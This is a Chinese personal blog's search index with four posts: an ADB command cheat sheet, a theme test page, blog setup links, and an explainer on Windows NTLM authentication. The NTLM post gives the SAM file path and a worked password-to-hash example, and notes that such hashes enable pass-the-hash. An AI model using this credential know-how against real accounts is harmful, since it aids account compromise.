<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ADB常用命令</title>
    <url>/2019/06/21/ADB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<blockquote><p>摘下红花送伊人<br>红花似火绾青丝<br>红花啊红花，绾起伊人的青丝<br>伊人笑靥如花</p>
<p>摘下白花送伊人<br>白花如雪别心口<br>白花啊白花，别在伊人的心口<br>伊人皎洁如月<br>伊人皎洁如月</p>
<footer><strong>美绪</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep259703" target="_blank" rel="noopener">Bilibili《多罗罗》</a></cite></footer></blockquote>

<a id="more"></a>

<hr>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1353269777&auto=1&height=66"></iframe>

<p><img src="73547799_p0.jpg" alt="73547799_p0.jpg"></p>
<!--  -->

<br>

<h2 id="基本与应用"><a href="#基本与应用" class="headerlink" title="基本与应用"></a>基本与应用</h2><hr>
<h3 id="查看设备"><a href="#查看设备" class="headerlink" title="查看设备"></a>查看设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb devices </span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># cf264b8f	device</span></span><br></pre></td></tr></table></figure>

<h3 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line"><span class="comment"># OnePlus3T:/ $ ll</span></span><br></pre></td></tr></table></figure>

<h3 id="以-root-权限运行-手机需要-root"><a href="#以-root-权限运行-手机需要-root" class="headerlink" title="以 root 权限运行(手机需要 root)"></a>以 root 权限运行(手机需要 root)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line"><span class="comment"># restarting adbd as root</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># adbd cannot run as root in production builds</span></span><br></pre></td></tr></table></figure>

<h3 id="无线连接（需要借助-USB-线）"><a href="#无线连接（需要借助-USB-线）" class="headerlink" title="无线连接（需要借助 USB 线）"></a>无线连接（需要借助 USB 线）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到 IP地址(ifconfig/ip addr/ip link)</span></span><br><span class="line">OnePlus3T:/ $ ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让设备在 任意 端口监听 TCP/IP 连接</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb tcpip 8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 断开连接</span></span><br><span class="line"><span class="comment"># 通过 IP 地址连接设备</span></span><br><span class="line">adb connect &lt;device-ip-address[:port]&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb connect 192.168.1.3:8848</span></span><br><span class="line"><span class="comment"># connected to 192.168.1.3:8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看设备是否出现</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb devices</span></span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># 192.168.1.3:8848	unauthorized</span></span><br></pre></td></tr></table></figure>

<h3 id="断开无线连接"><a href="#断开无线连接" class="headerlink" title="断开无线连接"></a>断开无线连接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb disconnect &lt;device-ip-address&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb disconnect 192.168.1.3:8848</span></span><br></pre></td></tr></table></figure>

<h3 id="查看应用列表"><a href="#查看应用列表" class="headerlink" title="查看应用列表"></a>查看应用列表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [--user USER_ID] [FILTER]</span></span><br><span class="line"><span class="comment"># -s 	只显示系统应用</span></span><br><span class="line"><span class="comment"># -3 	只显示第三方应用</span></span><br><span class="line"><span class="comment"># &lt;FILTER&gt; 	包名包含 &lt;FILTER&gt; 字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -3</span></span><br><span class="line"><span class="comment"># package:com.github.shadowsocks</span></span><br><span class="line"><span class="comment"># package:com.chenupt.day</span></span><br><span class="line"><span class="comment"># package:org.telegram.messenger</span></span><br><span class="line"><span class="comment"># package:com.niksoftware.snapseed</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -s</span></span><br><span class="line"><span class="comment"># package:com.oneplus.calculator</span></span><br><span class="line"><span class="comment"># package:net.oneplus.weather</span></span><br><span class="line"><span class="comment"># package:com.android.cts.priv.ctsshim</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages bili</span></span><br><span class="line"><span class="comment"># package:com.hypergryph.arknights.bilibili</span></span><br><span class="line"><span class="comment"># package:com.bilibili.comic</span></span><br><span class="line"><span class="comment"># package:com.digitalsky.girlsfrontline.cn.bili</span></span><br><span class="line"><span class="comment"># package:tv.danmaku.bili</span></span><br></pre></td></tr></table></figure>

<h3 id="安装-卸载-APK"><a href="#安装-卸载-APK" class="headerlink" title="安装/卸载 APK"></a>安装/卸载 APK</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb install [-lrtsdg] &lt;path_to_apk&gt;</span></span><br><span class="line"><span class="comment"># -l 	将应用安装到保护目录 /mnt/asec</span></span><br><span class="line"><span class="comment"># -r 	允许覆盖安装</span></span><br><span class="line"><span class="comment"># -t 	允许安装 AndroidManifest.xml 里 application 指定 android:testOnly="true" 的应用</span></span><br><span class="line"><span class="comment"># -s 	将应用安装到 sdcard</span></span><br><span class="line"><span class="comment"># -d 	允许降级覆盖安装</span></span><br><span class="line"><span class="comment"># -g 	授予所有运行时权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细 : &lt;https://github.com/mzlogin/awesome-adb#%E5%AE%89%E8%A3%85-apk&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb uninstall [-k] &lt;packagename&gt;</span></span><br><span class="line"><span class="comment"># &lt;packagename&gt; 表示应用的包名，-k 参数可选，表示卸载应用但保留数据和缓存目录</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb uninstall com.bilibili.comic</span></span><br></pre></td></tr></table></figure>

<h3 id="清除应用数据与缓存"><a href="#清除应用数据与缓存" class="headerlink" title="清除应用数据与缓存"></a>清除应用数据与缓存</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt;</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm clear com.bilibili.comic</span></span><br></pre></td></tr></table></figure>

<h3 id="查看应用详细信息"><a href="#查看应用详细信息" class="headerlink" title="查看应用详细信息"></a>查看应用详细信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic</span></span><br></pre></td></tr></table></figure>

<h3 id="查看应用安装路径"><a href="#查看应用安装路径" class="headerlink" title="查看应用安装路径"></a>查看应用安装路径</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm path &lt;PACKAGE&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm path com.bilibili.comic </span></span><br><span class="line"><span class="comment"># package:/data/app/com.bilibili.comic-VefU-I3Sq3yFa7hzXBuAXg==/base.apk</span></span><br></pre></td></tr></table></figure>

<h3 id="强制停止应用"><a href="#强制停止应用" class="headerlink" title="强制停止应用"></a>强制停止应用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell am force-stop &lt;packagename&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell am force-stop com.taobao.taoba</span></span><br></pre></td></tr></table></figure>

<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><hr>
<h3 id="复制设备里的文件到电脑"><a href="#复制设备里的文件到电脑" class="headerlink" title="复制设备里的文件到电脑"></a>复制设备里的文件到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb pull &lt;设备里的文件路径&gt; [电脑上的目录]</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb pull /sdcard/Pictures ~/Pictures</span></span><br></pre></td></tr></table></figure>

<h3 id="复制电脑里的文件到设备"><a href="#复制电脑里的文件到设备" class="headerlink" title="复制电脑里的文件到设备"></a>复制电脑里的文件到设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb push &lt;电脑上的文件路径&gt; &lt;设备里的目录&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb push ~/Documents/Python/hello.py /sdcard/Python</span></span><br></pre></td></tr></table></figure>

<h2 id="模拟按键-输入"><a href="#模拟按键-输入" class="headerlink" title="模拟按键/输入"></a>模拟按键/输入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input [&lt;source&gt;] &lt;command&gt; [&lt;arg&gt;...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adb shell input keyevent &lt;keycode&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 亮屏</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell input keyevent 224</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细: &lt;https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="实用功能"><a href="#实用功能" class="headerlink" title="实用功能"></a>实用功能</h2><h3 id="截图保存到电脑"><a href="#截图保存到电脑" class="headerlink" title="截图保存到电脑"></a>截图保存到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb exec-out screencap -p &gt; sc.png</span></span><br></pre></td></tr></table></figure>

<h3 id="录制屏幕"><a href="#录制屏幕" class="headerlink" title="录制屏幕"></a>录制屏幕</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 录制屏幕以 mp4 格式保存到 /sdcard</span></span><br><span class="line">adb shell screenrecord /sdcard/filename.mp4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按 Ctrl-C 停止</span></span><br><span class="line"><span class="comment"># 默认录制时间和最长录制时间都是 180 秒</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --size WIDTHxHEIGHT 	视频的尺寸，比如 1280x720，默认是屏幕分辨率。</span></span><br><span class="line"><span class="comment"># --bit-rate RATE 	视频的比特率，默认是 4Mbps。</span></span><br><span class="line"><span class="comment"># --time-limit TIME 	录制时长，单位秒。</span></span><br><span class="line"><span class="comment"># --verbose 	输出更多信息。</span></span><br></pre></td></tr></table></figure>

<h3 id="Top-amp-amp-ps"><a href="#Top-amp-amp-ps" class="headerlink" title="Top &amp;&amp; ps"></a>Top &amp;&amp; ps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell top</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell ps</span></span><br></pre></td></tr></table></figure>

<h3 id="查看进程-UID"><a href="#查看进程-UID" class="headerlink" title="查看进程 UID"></a>查看进程 UID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt; | grep userId=</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic | grep userId=</span></span><br><span class="line">    <span class="comment"># userId=10203</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>基本的 linux命令（ls/cat/df/rm/…）</p>
</blockquote>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
<li><a href="https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5" target="_blank" rel="noopener">ADB Usage Complete / ADB 用法大全</a> </li>
</ul>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Test Page</title>
    <url>/2019/06/12/Test-Page/</url>
    <content><![CDATA[<p>本页面用来进行测试</p>
<a id="more"></a>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1351291792&auto=1&height=66">
</iframe>

<h2 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h2><h3 id="h3"><a href="#h3" class="headerlink" title="h3"></a>h3</h3><h4 id="h4"><a href="#h4" class="headerlink" title="h4"></a>h4</h4><h5 id="h5"><a href="#h5" class="headerlink" title="h5"></a>h5</h5><hr>
<p><em>code</em> <code>code</code> <strong>code</strong> <del>code</del> </p>
<ul>
<li>list1</li>
<li>list2</li>
<li>list3<ul>
<li>llist1</li>
<li>llist2</li>
</ul>
</li>
</ul>
<ol>
<li>list1</li>
<li>list2</li>
<li>list3</li>
<li>list4</li>
</ol>
<figure class="highlight python"><figcaption><span>Test</span><a href="https://404.com" target="_blank" rel="noopener">404.py</a></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"ls -l"</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>I jump you jump </p>
</blockquote>
<blockquote><p>行千里路，吃万家菜</p>
<footer><strong>佚名, Internet</strong><cite><a href="https://404.com" target="_blank" rel="noopener">您可就别点击了</a></cite></footer></blockquote>


<p><a href="https://404.com" target="_blank" rel="noopener">https://404.com</a></p>
<p><a href="https://404.com" title="404" target="_blank" rel="noopener">404</a></p>
<p>$C^2$</p>
<pre class="mermaid">graph LR 
    subgraph 初始轮 
        txt[明文块] --> init0[加轮秘钥] 
    end 
    subgraph 普通轮 第1轮
        pu0[字节代替] 
        pu1[行移位] 
        pu2[列混淆] 
        pu3[加轮秘钥] 
    end
    init0[加轮秘钥] --> pu0[字节代替] 
    pu3[加轮秘钥] --> lue0[...] 
    subgraph 普通轮 第9轮
        pu20[字节代替] 
        pu21[行移位] 
        pu22[列混淆] 
        pu23[加轮秘钥] 
    end
    lue0[...] --> pu20[字节代替] 

    subgraph 最终轮
        end0[字节代替]
        end1[行移位]
        end2[加轮秘钥]
    end
    pu23[加轮秘钥] --> end0[字节代替]
    end2[加轮秘钥] --> end3[密文] 

    subgraph 扩展密钥
        expand0[W 0-15]
        expand1[W 16-31]
        expand2[W 144-159]
        expand3[W 160-175]
    end

    密钥 --- expand0[W 0-15]

    expand0[W 0-15] --> init0[加轮秘钥]
    expand1[W 16-31] --> pu3[加轮秘钥]
    expand2[W 144-159] --> pu23[加轮秘钥]
    expand3[W 160-175] --> end2[加轮秘钥]</pre>

<hr>
<p><img src="74716414_p0.jpg" alt="error"></p>
<hr>
<img src="/2019/06/12/Test-Page/74716414_p0.jpg" width="400" height="600" title="祢豆子 鬼灭">]]></content>
      <tags>
        <tag>Test</tag>
      </tags>
  </entry>
  <entry>
    <title>Blog Reference Link</title>
    <url>/2019/06/14/Blog-Reference-Link/</url>
    <content><![CDATA[<blockquote><p>恩 有点特别的信<br>但是<br>但这是……<br>世界上最纯粹最美丽的思念</p>
<footer><strong>文伽</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep102379" target="_blank" rel="noopener">Bilibili《死后文》</a></cite></footer></blockquote>

<a id="more"></a>
<hr>
<!-- ![68527244_p0.jpg](68527244_p0.jpg) -->
<img src="/2019/06/14/Blog-Reference-Link/68527244_p0.jpg" width="600" height="600" title="68527244_p0.jpg">

<br>

<p>配置 Blog时参考的链接：</p>
<ul>
<li><a href="https://blog.csdn.net/u011475210/article/details/79023429" target="_blank" rel="noopener">从jekyll到hexo</a></li>
<li><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></li>
<li><a href="https://www.jianshu.com/p/1f8107a8778c" target="_blank" rel="noopener">hexo搭建个人博客–NexT主题优化</a></li>
<li><a href="https://blog.csdn.net/u011054333/article/details/82718910" target="_blank" rel="noopener">在Hexo博客上添加可爱的Live2D模型</a></li>
<li><a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">Hexo添加字数统计、阅读时长</a></li>
<li><a href="https://segmentfault.com/q/1010000017254914" target="_blank" rel="noopener">下载的hexo主题必须删掉.git</a></li>
<li><a href="https://www.cnblogs.com/php-linux/p/8416116.html" target="_blank" rel="noopener">2个小时教你hexo博客添加评论、打赏…</a></li>
<li><a href="https://blog.csdn.net/qq_36759224/article/details/82121420#font_colorFF000__Hexo__Github_font_155" target="_blank" rel="noopener">使用GithubPages和Hexo搭建自己…</a></li>
<li><a href="https://hubojing.github.io/2016/04/06/%E5%B0%86hexo-github%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%AD%A5%E6%89%98%E7%AE%A1%E8%87%B3coding/" target="_blank" rel="noopener">将hexo+github博客同步托管至coding</a></li>
<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT使用文档</a></li>
<li><a href="https://www.jianshu.com/p/2e318226c88d" target="_blank" rel="noopener">使用Hexo+Next主题搭建自己的个人博客</a></li>
</ul>
<br>

<ul>
<li><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程</a></li>
<li><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">Hexo NexT主题中集成gitalk评论系统</a></li>
<li><a href="https://tyloafer.github.io/posts/7790/" target="_blank" rel="noopener">Hexo中引入Mermaid流程图</a></li>
<li><a href="https://github.com/webappdevelp/hexo-filter-mermaid-diagrams" target="_blank" rel="noopener">hexo-filter-mermaid-diagrams</a></li>
</ul>
<hr>
<blockquote>
<p>配置 gitalk评论系统注意</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitalk.swig </span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> Gitalk(&#123;</span><br><span class="line">      clientID: <span class="string">'&#123;&#123; theme.gitalk.ClientID &#125;&#125;'</span>,   <span class="comment">// &lt;----</span></span><br><span class="line">      clientSecret: <span class="string">'&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;'</span>, <span class="comment">// &lt;----</span></span><br><span class="line">      repo: <span class="string">'&#123;&#123; theme.gitalk.repo &#125;&#125;'</span>,</span><br><span class="line">      owner: <span class="string">'&#123;&#123; theme.gitalk.githubID &#125;&#125;'</span>,</span><br><span class="line">      admin: [<span class="string">'&#123;&#123; theme.gitalk.adminUser &#125;&#125;'</span>],</span><br><span class="line">      id: location.pathname,</span><br><span class="line">      distractionFreeMode: <span class="string">'&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    gitalk.render(<span class="string">'gitalk-container'</span>)           </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">githubID:</span> <span class="string">evilH2O2</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitalkComments</span>   </span><br><span class="line">  <span class="attr">ClientID:</span> <span class="string">xxxx</span>      <span class="comment"># &lt;---- 与上面对应，网上有版本不一样的 （ client_id )</span></span><br><span class="line">  <span class="attr">ClientSecret:</span> <span class="string">xxx</span>   <span class="comment"># &lt;---- 与上面对应</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">evilH2O2</span></span><br><span class="line">  <span class="attr">adminUser:</span> <span class="string">evilH2O2</span> </span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>用 代码块(3个 `) + mermaid使用 Mermaid流程图</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ``3 mermaid</span></span><br><span class="line"><span class="comment"># graph LR </span></span><br><span class="line"><span class="comment">#   A --&gt; B</span></span><br><span class="line"><span class="comment"># ``3</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows认证体系—NTLM认证</title>
    <url>/2019/08/23/Windows%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94NTLM%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<p>NTLM Hash与 NTLM的关系、NTLM网络认证流程</p>
<a id="more"></a>

<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><ul>
<li><code>NTLM Hash</code> </li>
<li><code>NTLM</code> </li>
<li><code>LSASS</code> </li>
<li><code>Net-NTLM hash</code> </li>
</ul>
<br>

<p>关键词解释：</p>
<ul>
<li><code>NTLM Hash</code>：存储在<code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果</li>
<li><code>Net-NTLM hash</code>：通常是指网络环境下 NTLM认证中的 Hash (下有说明)</li>
<li><code>NTLM</code>：除 <code>Kerberos</code>之外的一种网络认证协议，只支持 Windows </li>
<li><code>LSASS</code>：Windows系统的安全机制（系统进程）。用于本地安全和登陆策略 </li>
</ul>
<br>

<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><br>

<p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)中。</p>
<blockquote>
<p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code> </p>
</blockquote>
<p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code>*，与  SAM数据库中的 *<code>NTLM Hash</code></em> 进行比较，从而实现认证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)</span><br></pre></td></tr></table></figure>

<p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，这个进程中会存一份明文密码，将明文密码加密成 <code>NTLM Hash</code>，对比 SAM数据库中的 Hash进行验证</p>
<br>

<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><br>

<blockquote>
<p>Hash，<strong><em>一种将任意长度的消息压缩到某一固定长度的消息摘要的函数</em></strong> 。—— <a href="https://baike.baidu.com/item/Hash/390310?fr=aladdin" target="_blank" rel="noopener">度娘百科</a>  </p>
</blockquote>
<p>通常意义上的 <code>NTLM Hash</code>指存储在 <code>SAM数据库</code>及<code>NTDS数据库</code>中对密码进行 Hash摘要计算后的结果，这类 Hash可以直接用于 PTH，并且通常存在于 <code>LSASS</code>进程中，便于 SSP（NTLM 安全支持提供程序）使用</p>
<br>

<h3 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM Hash的生成"></a>NTLM Hash的生成</h3><br>

<ul>
<li>用户密码：<code>susi2001</code></li>
<li>首先，密码经过十六进制转为 <code>7375736932303031</code> </li>
<li>将十六进制结果转为 Unicode格式 <code>73007500730069003200300030003100</code></li>
<li>以 Hex（16进制）数据作 MD4加密 <code>ed3202726368f8e9fd23e78fbfac8c13</code> </li>
</ul>
<br>

<blockquote>
<p>MD4加密使用 <code>HashCalc</code> </p>
</blockquote>
<br>

<h2 id="NTLM-和-NTLM-Hash"><a href="#NTLM-和-NTLM-Hash" class="headerlink" title="NTLM 和 NTLM Hash"></a>NTLM 和 NTLM Hash</h2><br>

<p>NTLM 是一种网络认证协议，与 <code>NTLM Hash</code>的关系就是：<strong>NTLM网络认证协议是以 <code>NTLM Hash</code> 作为根本凭证进行认证的协议</strong></p>
<br>

<h2 id="NTLM网络认证机制"><a href="#NTLM网络认证机制" class="headerlink" title="NTLM网络认证机制"></a>NTLM网络认证机制</h2><br>

<p>NTLM是一种基于质询/应答 （<em>Challenge/Response</em> ）消息交换模式的认证机制，常用于 <strong>工作组</strong>和<strong>域环境</strong>下<em>登录场景的身份认证</em></p>
<br>

<h3 id="NTLM-认证方式"><a href="#NTLM-认证方式" class="headerlink" title="NTLM 认证方式"></a>NTLM 认证方式</h3><br>

<ul>
<li><strong>交互式认证</strong> ：使用域账号登录到客户端；涉及两部分（客户端、域控）</li>
<li><strong>非交互式认证</strong> ：在已经登陆 的客户端上使用 SSO 的方式访问一台服务器；涉及三部分（客户端、域控、服务器）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非交互式场景</span></span><br><span class="line"></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:domain\xiaoming </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">net use Z: \\10.0.1.102\vefs <span class="string">"password"</span> /user:xiaoming</span><br></pre></td></tr></table></figure>

<br>

<h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><br>

<p>NTLM协议的认证过程有三步：</p>
<ul>
<li><strong>协商</strong>：主要用于确认双方协议版本（NTLMv1、NTLMv2等）</li>
<li><strong>质询</strong>：质询/应答 （<em>Challenge/Response</em>）模式，用于消息交换</li>
<li><strong>验证</strong>：验证身份合法性，通常由 Server端或 DC完成这个过程</li>
</ul>
<p>大致流程如下：</p>
<ul>
<li>使用用户名和密码尝试登录客户端</li>
<li>客户端对密码进行哈希处理并缓存密码 hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
<li>服务器生成一个 16字节的随机数，称为 <strong>质询</strong> (Challenge) 或随机数 (nonce.aspx)，并发送给客户端</li>
<li>客户端使用缓存的 <strong><em>用户密码的 Hash</em></strong> 对此 <code>Challenge</code> 进行加密，加密结果为 <code>Response</code>（暂且叫做<code>Challenge1</code>），然后将结果发送给服务器</li>
<li>服务器发送三项数据给域控制器：<ul>
<li><code>User name</code></li>
<li>发送给客户端的 <code>Challenge</code>（已加密） </li>
<li>从客户端接收到的 <code>Response</code> </li>
</ul>
</li>
<li>域控制器使用 <code>User name</code>从 AD中检索该用户密码的 <code>NTLM Hash</code>，并使用此 <code>NTLM Hash</code>来加密 <em><code>Challenge</code></em> ，然后把这个值和客户端计算的响应值（<code>Challenge1</code>）进行比较。如果它们相同，则验证成功</li>
</ul>
<blockquote>
<p>经过 <code>NTLM Hash</code>加密 <code>Challenge</code>的结果在网络协议中称之为 <code>Net NTLM Hash</code> </p>
</blockquote>
<blockquote>
<p>在以上流程中，用户的登录密码 Hash 即为 <code>NTLM Hash</code>，Response中则包含 <code>Net-NTLM Hash</code></p>
</blockquote>
<br>

<h3 id="NTLM-v2"><a href="#NTLM-v2" class="headerlink" title="NTLM v2"></a>NTLM v2</h3><br>

<blockquote>
<p>NTLM version 2 (NTLMv2)是在 Windows NT 4.0 SP4中引入的（在 Windows 2000 中得到了本地支持），它通过加强协议来防止许多欺骗攻击，并增加服务器向客户机进行身份验证的能力，从而增强了 NTLM的安全性</p>
</blockquote>
<p><code>NTLM v1</code> 与 <code>NTLM v2</code> 最显著的区别就是 <code>Challenge</code> 与 <strong>加密算法</strong> 不同，共同点就是加密的原料都是 <code>NTLM Hash</code> ：</p>
<ul>
<li>Challenge：<ul>
<li><code>v1</code>： 8-byte</li>
<li><code>v2</code>：16-byte </li>
</ul>
</li>
<li>Net NTLM Hash：<ul>
<li><code>v1</code>：DES</li>
<li><code>v2</code>： HMAC-MD5</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | <span class="number">5</span>-bytes<span class="number">-0</span></span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM v2</span></span><br><span class="line"></span><br><span class="line">SC = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">CC = <span class="number">8</span>-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure>

<br>

<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
<li><a href="http://wikipedia.moesalih.com/NTLM" target="_blank" rel="noopener">NT LAN Manager</a></li>
<li><a href="http://www.voidcn.com/article/p-voxshmho-sn.html" target="_blank" rel="noopener">NTLM 协议</a></li>
